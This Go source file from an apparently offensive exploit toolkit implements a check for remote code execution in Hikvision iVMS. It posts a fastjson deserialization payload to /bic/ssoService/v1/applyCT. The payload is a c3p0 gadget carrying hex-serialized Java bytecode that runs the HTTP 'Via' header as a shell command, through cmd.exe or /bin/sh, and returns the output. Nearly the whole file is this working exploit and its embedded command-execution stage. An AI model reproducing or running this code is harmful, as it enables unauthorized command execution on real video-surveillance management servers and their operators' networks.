package hikvision

import (
	"Exploit/common"
	"github.com/projectdiscovery/gologger"
	"io/ioutil"
	"net/http"
	"strings"
)

func Hikvision_ivms_fastjson(options *common.Options) {
	exp_path := "/bic/ssoService/v1/applyCT"
	exp_body := "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000949000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785a00155f75736553657276696365734d656368616e69736d4c00195f61636365737345787465726e616c5374796c65736865657471007e00044c000b5f617578436c617373657374003b4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f486173687461626c653b5b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff00740003616c6c70757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e0020000787000000e88cafebabe0000003200e5010010623531333037373437313333333730300700010100106a6176612f6c616e672f4f626a65637407000301000a536f7572636546696c65010015623531333037373437313333333730302e6a6176610100097772697465426f6479010017284c6a6176612f6c616e672f4f626a6563743b5b4229560100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b08000901000f6a6176612f6c616e672f436c61737307000b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0c000d000e0a000c000f01000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b0c001100120a000c001301000873657442797465730800150100025b420700170100116a6176612f6c616e672f496e7465676572070019010004545950450100114c6a6176612f6c616e672f436c6173733b0c001b001c09001a001d0100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0c001f00200a000c00210100063c696e69743e010004284929560c002300240a001a00250100186a6176612f6c616e672f7265666c6563742f4d6574686f64070027010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c0029002a0a0028002b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0c002d002e0a0004002f010007646f57726974650800310100096765744d6574686f640c003300200a000c00340100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0700360100136a6176612e6e696f2e427974654275666665720800380100047772617008003a0100136a6176612f6c616e672f457863657074696f6e07003c010004436f646501000a457863657074696f6e7301000d537461636b4d61705461626c650100056765744656010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f4f626a6563743b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0c004300440a000c004501001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e07004701000d6765745375706572636c6173730c0049002e0a000c004a010015284c6a6176612f6c616e672f537472696e673b29560c0023004c0a0048004d0100226a6176612f6c616e672f7265666c6563742f41636365737369626c654f626a65637407004f01000d73657441636365737369626c65010004285a29560c005100520a005000530100176a6176612f6c616e672f7265666c6563742f4669656c64070055010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0c005700580a005600590100032829560c0023005b0a0004005c0100106a6176612f6c616e672f54687265616407005e01000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b0c006000610a005f006201000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b0c006400650a005f0066010007746872656164730800680c004100420a0002006a0100135b4c6a6176612f6c616e672f5468726561643b07006c0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b0c006e006f0a005f0070010004657865630800720100106a6176612f6c616e672f537472696e67070074010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c007600770a007500780100046874747008007a01000674617267657408007c0100126a6176612f6c616e672f52756e6e61626c6507007e01000674686973243008008001000768616e646c6572080082010006676c6f62616c08008401000a70726f636573736f727308008601000e6a6176612f7574696c2f4c69737407008801000473697a650100032829490c008a008b0b0089008c0100152849294c6a6176612f6c616e672f4f626a6563743b0c0057008e0b0089008f01000372657108009101000b676574526573706f6e73650800930100096765744865616465720800950100035669610800970100076973456d70747901000328295a0c0099009a0a0075009b01000973657453746174757308009d0100076f732e6e616d6508009f0100106a6176612f6c616e672f53797374656d0700a101000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c00a300a40a00a200a501000b746f4c6f776572436173650c00a7006f0a007500a801000677696e646f770800aa010007636d642e6578650800ac0100022f630800ae0100072f62696e2f73680800b00100022d630800b20100116a6176612f7574696c2f5363616e6e65720700b40100186a6176612f6c616e672f50726f636573734275696c6465720700b6010016285b4c6a6176612f6c616e672f537472696e673b29560c002300b80a00b700b9010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0c00bb00bc0a00b700bd0100116a6176612f6c616e672f50726f636573730700bf01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0c00c100c20a00c000c3010018284c6a6176612f696f2f496e70757453747265616d3b29560c002300c50a00b500c60100025c410800c801000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b0c00ca00cb0a00b500cc0100046e6578740c00ce006f0a00b500cf010008676574427974657301000428295b420c00d100d20a007500d30c000700080a000200d501000d67657450726f7065727469657301001828294c6a6176612f7574696c2f50726f706572746965733b0c00d700d80a00a200d90100136a6176612f7574696c2f486173687461626c650700db010008746f537472696e670c00dd006f0a00dc00de0100135b4c6a6176612f6c616e672f537472696e673b0700e0010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700e20a00e3005c0021000200e3000000000003000a000700080002003e0000012f00080005000000f6120ab800104e2db600144d2d121606bd000c59031218535904b2001e535905b2001e53b600222c06bd000459032b535904bb001a5903b70026535905bb001a592bbeb7002653b6002c572ab60030123204bd000c59032d53b600352a04bd000459032c53b6002c57a7008d3a041239b800104e2d123b04bd000c5903121853b600222d04bd000459032b53b6002c4d2ab60030123204bd000c59032d53b600352a04bd000459032c53b6002c57a700483a041239b800104e2d123b04bd000c5903121853b600222d04bd000459032b53b6002c4d2ab60030123204bd000c59032d53b600352a04bd000459032c53b6002c57a70003b1000200000068006b00370000006800b0003d00010040000000170003f7006b070037f7004407003dfd004407000407000c003f000000040001003d000a004100420002003e0000006c000300050000003f014d2ab600304ea700192d2bb600464da70016a700003a042db6004b4ea700032d1204a6ffe72c01a6000cbb0048592bb7004ebf2c04b600542c2ab6005ab00001000a00130016004800010040000000130006fd000a07005607000c084207004809050d003f000000040001003d00010023005b0002003e000002920008000d000001b82ab700e4033604b80063b600671269b8006bc0006d3a0503360615061905bea2019819051506323a07190701a60006a701821907b600714e2d1273b600799a000c2d127bb600799a0006a701671907127db8006b4c2bc1007f9a0006a701552b1281b8006b1283b8006b1285b8006b4ca7000b3a08a7013ca700002b1287b8006bc000893a0903360a150a1909b9008d0100a201171909150ab9009002003a0b190b1292b8006b4c2bb60030129403bd000cb600352b03bd0004b6002c4d2bb60030129604bd000c5903127553b600352b04bd00045903129853b6002cc000754e2d01a5000a2db6009c990006a7008d2cb60030129e04bd000c5903b2001e53b600352c04bd00045903bb001a591100c8b7002653b6002c5712a0b800a6b600a912abb6007999001806bd0075590312ad53590412af5359052d53a7001506bd0075590312b153590412b35359052d533a0c2cbb00b559bb00b759190cb700bab600beb600c4b700c712c9b600cdb600d0b600d4b800d60436042d01a5000a2db6009c99000815049a0006a700102cb800dab600dfb600d4b800d61504990006a70009840a01a7fee31504990006a70009840601a7fe66b10001005f00700073003d00010040000000c00016ff001a00070700020000000107006d010000fc001707005fff0017000807000200000700750107006d0107005f000002ff00110008070002070004000700750107006d0107005f00005307003d0402fe000d0007008901ff0063000c0700020700040700040700750107006d0107005f0007008901070004000002fb004d510700e1290b04020c07ff0005000b070002070004000700750107006d0107005f00070089010000ff000700080700020000000107006d0107005f0000fa0005003f000000040001003d000100050000000200067074000161707701007871007e000e78;\"}}"
	exp_body_io := strings.NewReader(exp_body)
	client, err := common.InitHttpClient(options.Proxy)
	if err != nil {
		gologger.Warning().Msgf("HTTP方法初始化失败")
	}
	req, _ := http.NewRequest("POST", options.Url+exp_path, exp_body_io)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Via", "echo Qianxinnb")

	resp, err := (client).Do(req)
	defer resp.Body.Close()

	//读取响应信息
	rst, _ := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(rst))
	if strings.Contains(string(rst), "Qianxinnb") {
		gologger.Print().Msgf("[+] %s 存在 Hikvision_ivms_fastjson 漏洞", options.Url)
	}
}
